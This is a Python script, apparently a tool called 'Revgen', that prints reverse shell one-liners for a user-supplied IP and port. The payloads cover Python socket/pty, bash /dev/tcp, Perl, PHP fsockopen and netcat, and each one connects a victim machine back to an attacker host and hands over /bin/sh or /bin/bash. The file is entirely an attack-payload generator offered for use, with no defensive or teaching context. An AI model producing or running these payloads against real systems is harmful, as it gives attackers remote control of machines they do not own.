import os
import time


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    WHITE = '\u001b[37m'


def payloads(ip, port, option):
    print("" + bcolors.WARNING)
    banner = """

     ---------------------------------------------------

    ██████╗░███████╗██╗░░░██╗░██████╗░███████╗███╗░░██╗
    ██╔══██╗██╔════╝██║░░░██║██╔════╝░██╔════╝████╗░██║
    ██████╔╝█████╗░░╚██╗░██╔╝██║░░██╗░█████╗░░██╔██╗██║
    ██╔══██╗██╔══╝░░░╚████╔╝░██║░░╚██╗██╔══╝░░██║╚████║
    ██║░░██║███████╗░░╚██╔╝░░╚██████╔╝███████╗██║░╚███║
    ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░░╚═════╝░╚══════╝╚═╝░░╚══╝

     ---------------------------------------------------
     """
    print(banner)
    print("" + bcolors.OKGREEN)

    if option == 1:
        s = "/bin/bash"
        print("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + '"' + ip +
              '"' + "," + port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("'"'+s+'"'")'")
    if option == 2:
        bash_tcp = """
           bash -i >& /dev/tcp/""" + ip + """/""" + port + """ 0>&1

           0<&196;exec 196<>/dev/tcp/""" + ip + """/""" + port + """; sh <&196 >&196 2>&196
           """
        print(bash_tcp)
    if option == 3:
        t = '"'+ip+'"'
        perl = """
        perl -e 'use Socket;$i="""+t+"""; $p =""" + port+"""; socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp")); if(connect(S, sockaddr_in($p, inet_aton($i)))){open(STDIN, ">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S"); exec("/bin/sh -i"); }; '"""
        print(perl)
    if option == 4:
        r = '"'+ip+'"'
        php = """
        php -r '$sock=fsockopen("""+r+""","""+port+""");$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"""
        print(php)
    if option == 5:
        nc = """
        nc -e /bin/bash """+ip+""" """+port
        print(nc)

    # I will put more payloads on the future
